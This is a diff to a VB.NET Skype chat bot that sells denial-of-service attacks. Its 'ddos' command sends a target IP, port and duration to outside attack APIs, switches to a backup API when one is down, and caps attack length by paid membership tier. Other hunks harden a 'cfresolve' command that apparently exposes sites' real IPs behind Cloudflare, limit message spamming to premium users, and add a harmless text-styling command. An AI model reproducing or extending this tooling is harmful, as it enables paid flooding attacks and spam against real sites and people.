@@ -67,15 +67,36 @@ Public Class Form1
         msg.Body = message
     End Sub
     Function ddos(ip As String, port As Integer, time As Integer)
+
+        Dim Number As Integer
+
+        Dim w As New WebClient
+        w.Proxy = Nothing
+        Dim res As String = w.DownloadString("http://www.isup.me/" & api)
+        Dim res2 As String = w.DownloadString("http://www.isup.me/" & ddosapi2)
+        Dim offline As Boolean = res.ToLower.Contains("down")
+        Dim offline2 As Boolean = res2.ToLower.Contains("down")
+        If offline And offline Then
+            Return "API offline"
+            Exit Function
+        ElseIf offline Then
+            Number = 2
+            GoTo switch
+        ElseIf offline2 Then
+            Number = 1
+            GoTo switch
+        End If
+
 retr:
         Randomize()
-        Dim Number As Integer = Int(Rnd() * 3)
+        Number = Int(Rnd() * 3)
         If Number = 3 Or Number = 0 Then GoTo retr
 
+switch:
         If Number = 1 Then
             Return WBDL(api.Replace("[ip]", ip).Replace("[time]", time).Replace("[port]", port))
         ElseIf Number = 2 Then
-            Return WBDL(api.Replace("[ip]", ip).Replace("[time]", time).Replace("[port]", port))
+            Return WBDL(ddosapi2.Replace("[ip]", ip).Replace("[time]", time).Replace("[port]", port))
         Else : GoTo retr
         End If
     End Function
@@ -1667,6 +1688,7 @@ exitt:
             If command = "ddos" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "ddos <ip> <port> <time>")
             If command.StartsWith("ddos ") Then
                 Dim dds As ChatMessage = msg.Chat.SendMessage("Initializing...")
+
                 Dim cmd As String = command.Replace("ddos ", "")
                 AddSwagToMSG(dds, "Starting ddos...")
                 Dim splittr As String() = cmd.Split(" ")
@@ -1690,10 +1712,12 @@ exitt:
                     If tme > 600 And IsUltimate(msg.Sender.Handle) Then
                         AddSwagToMSG(dds, "Maximum time is 600s")
                         Exit Sub
-                    ElseIf tme > 300 And IsPremium(msg.Sender.Handle) Then
+                    End If
+                    If tme > 300 And IsPremium(msg.Sender.Handle) And IsUltimate(msg.Sender.Handle) = False Then
                         AddSwagToMSG(dds, "Maximum time is 300s")
                         Exit Sub
-                    ElseIf IsNormalUser(msg.Sender.Handle) Then
+                    End If
+                    If IsNormalUser(msg.Sender.Handle) Then
                         AddSwagToMSG(dds, "Non upgraded users are not able to use this, see !buy or contact the owner.")
                         Exit Sub
                     End If
@@ -1713,8 +1737,13 @@ exitt:
                 End If
                 AddSwagToMSG(dds, "Request for attack sent/sending! (No feedback received yet)...")
 
-                Dim res As String = ddos(ip, port, tme)
-                AddSwagToMSG(dds, "Received a 200 response code. Let's hope it works! (We currently have no way to check if the attack has been sent successful)")
+                If ddos(ip, port, tme) = "API offline" Then
+                    AddSwagToMSG(dds, "API currently offline.")
+                    Exit Sub
+                Else
+                    Dim res As String = ddos(ip, port, tme)
+                    AddSwagToMSG(dds, "Received a 200 response code. Let's hope it works! (We currently have no way to check if the attack has been sent successful)")
+                End If
             End If
             'DDOS END
             'SIDGRAB START
@@ -1863,10 +1892,14 @@ exitt:
             'CF RESOLVE START
             If command = "cfresolve" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "cfresolve <website>")
             If command.StartsWith("cfresolve ") Then
-                Dim l As ChatMessage = msg.Chat.SendMessage("Trying to resolve...")
+                Dim cfresolve As ChatMessage = msg.Chat.SendMessage("Trying to resolve...")
                 Dim w As New WebClient
-                l.Body = w.DownloadString("http://api.predator.wtf/cfresolve/?arguments=" & command.Replace("cfresolve ", "")).Replace("<br>", vbNewLine)
-                Exit Sub
+                Try
+                    cfresolve.Body = w.DownloadString("http://api.predator.wtf/cfresolve/?arguments=" & command.Replace("cfresolve ", "")).Replace("<br>", vbNewLine)
+                    Exit Sub
+                Catch headerEx As System.Net.WebException
+                    AddSwagToMSG(cfresolve, "API currently experiencing problems.")
+                End Try
             End If
             'CF RESOLVE END
             'REVERSE START
@@ -1935,7 +1968,7 @@ exitt:
                 For a = 3 To d.Length - 1
                     tosend = tosend & " " & d(a)
                 Next
-                AddSwagToMSG(mesg, "Sending the msg....")
+                AddSwagToMSG(mesg, "Sending the msg...")
                 For qq = 1 To d(1) - 0
                     mesg.Body = "Sended MSG " & qq & "/" & d(1) & "."
                     Skypattach.SendMessage(d(0), tosend.Replace("/", "").Replace("!", ""))
@@ -2143,11 +2176,14 @@ exitt:
                 Dim weather As ChatMessage = msg.Chat.SendMessage("Initializing...")
                 Dim w As New WebClient
                 w.Proxy = Nothing
-                Dim res As String = w.DownloadString("http://api.predator.wtf/weather/?arguments=" & location)
-                'Dim linearr() As String
-                res = res.Replace("<br>", vbNewLine)
-                AddSwagToMSG(weather, res)
-                Exit Sub
+                Try
+                    Dim res As String = w.DownloadString("http://api.predator.wtf/weather/?arguments=" & location)
+                    res = res.Replace("<br>", vbNewLine)
+                    AddSwagToMSG(weather, res)
+                    Exit Sub
+                Catch headerEx As System.Net.WebException
+                    AddSwagToMSG(weather, "API currently experiencing problems.")
+                End Try
             End If
             'WEATHER END
 
@@ -2502,6 +2538,71 @@ exitt:
             End If
             'FLIP END
 
+            'COOLIFY START
+            If command = "coolify" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "coolify <text>")
+            If command.StartsWith("coolify ") Then
+
+                Dim coolify As ChatMessage = msg.Chat.SendMessage("Coolifying..")
+                Dim coolStr As String = command.Replace("coolify ", "")
+
+                coolStr = coolStr.Replace("a", "α")
+                coolStr = coolStr.Replace("b", "в")
+                coolStr = coolStr.Replace("c", "c")
+                coolStr = coolStr.Replace("d", "∂")
+                coolStr = coolStr.Replace("e", "ε")
+                coolStr = coolStr.Replace("f", "f")
+                coolStr = coolStr.Replace("g", "g")
+                coolStr = coolStr.Replace("h", "н")
+                coolStr = coolStr.Replace("i", "ι")
+                coolStr = coolStr.Replace("j", "נ")
+                coolStr = coolStr.Replace("k", "к")
+                coolStr = coolStr.Replace("l", "ℓ")
+                coolStr = coolStr.Replace("m", "м")
+                coolStr = coolStr.Replace("n", "η")
+                coolStr = coolStr.Replace("o", "σ")
+                coolStr = coolStr.Replace("p", "ρ")
+                coolStr = coolStr.Replace("q", "q")
+                coolStr = coolStr.Replace("r", "я")
+                coolStr = coolStr.Replace("s", "s")
+                coolStr = coolStr.Replace("t", "т")
+                coolStr = coolStr.Replace("u", "υ")
+                coolStr = coolStr.Replace("v", "v")
+                coolStr = coolStr.Replace("w", "ω")
+                coolStr = coolStr.Replace("x", "x")
+                coolStr = coolStr.Replace("y", "y")
+                coolStr = coolStr.Replace("z", "z")
+
+                coolStr = coolStr.Replace("A", "α")
+                coolStr = coolStr.Replace("B", "в")
+                coolStr = coolStr.Replace("C", "c")
+                coolStr = coolStr.Replace("D", "∂")
+                coolStr = coolStr.Replace("E", "ε")
+                coolStr = coolStr.Replace("F", "f")
+                coolStr = coolStr.Replace("G", "g")
+                coolStr = coolStr.Replace("H", "н")
+                coolStr = coolStr.Replace("I", "ι")
+                coolStr = coolStr.Replace("J", "נ")
+                coolStr = coolStr.Replace("K", "к")
+                coolStr = coolStr.Replace("L", "ℓ")
+                coolStr = coolStr.Replace("M", "м")
+                coolStr = coolStr.Replace("N", "η")
+                coolStr = coolStr.Replace("O", "σ")
+                coolStr = coolStr.Replace("P", "ρ")
+                coolStr = coolStr.Replace("Q", "q")
+                coolStr = coolStr.Replace("R", "я")
+                coolStr = coolStr.Replace("S", "s")
+                coolStr = coolStr.Replace("T", "т")
+                coolStr = coolStr.Replace("U", "υ")
+                coolStr = coolStr.Replace("V", "v")
+                coolStr = coolStr.Replace("W", "ω")
+                coolStr = coolStr.Replace("X", "x")
+                coolStr = coolStr.Replace("Y", "y")
+                coolStr = coolStr.Replace("Z", "z")
+
+                AddSwagToMSG(coolify, coolStr)
+            End If
+            'COOLIFY END
+
 l:
         Catch ex As Exception
             If ex.ToString.Contains("IndexOutOfRangeException") Or ex.ToString.ToLower.Contains("index") Then
@@ -2550,6 +2651,8 @@ l:
                     d(0) = 0
                 ElseIf d(0) > 0 And IsNormalUser(msg.Sender.Handle) Then
                     d(0) = 0
+                    msg.Chat.SendMessage("Sorry, spamming is currently for premium users only!")
+                    Exit Sub
                 End If
             Else
                 msg.Chat.SendMessage("ERROR: You entered an invalid number, try to swap the number and msg!")
